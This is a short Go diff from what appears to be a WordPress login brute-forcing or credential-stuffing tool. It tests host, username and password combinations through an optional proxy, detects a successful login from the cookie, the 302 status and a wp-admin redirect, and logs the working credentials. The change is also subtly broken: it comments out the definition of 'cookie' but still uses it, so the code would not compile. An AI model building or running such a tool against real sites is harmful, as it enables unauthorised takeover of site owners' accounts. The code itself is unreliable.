@@ -55,11 +55,15 @@ func (w *WpGo) Login(siteTask SiteTask) {
 		w.http.SetProxy(Proxy)
 	}
 	w.http.Execute()
-	w.http.Byte()
-	cookie := w.http.RespCookie()
+	w.http.Text()
+	//cookie := w.http.RespCookie()
 	//log.Println(cookie)
 	//log.Println(w.http.StatusCode())
-	if strings.Contains(cookie, "wordpress_logged_in") && w.http.StatusCode() == 302 {
+	//log.Println(w.http.HttpResponse.Header)
+	location := w.http.HttpResponse.Header.Get("location")
+	//log.Println(location)
+	//log.Println(r)
+	if strings.Contains(cookie, "wordpress_logged_in") && w.http.StatusCode() == 302 && strings.Contains(location, "wp-admin") {
 		key := fmt.Sprintf("%s|||%s", siteTask.Host, siteTask.User)
 		w.SetSuccess(key)
 		line := fmt.Sprintf("[!] Successful %s - U: %s - P: %s\n", siteTask.Host, siteTask.User, siteTask.Pass)
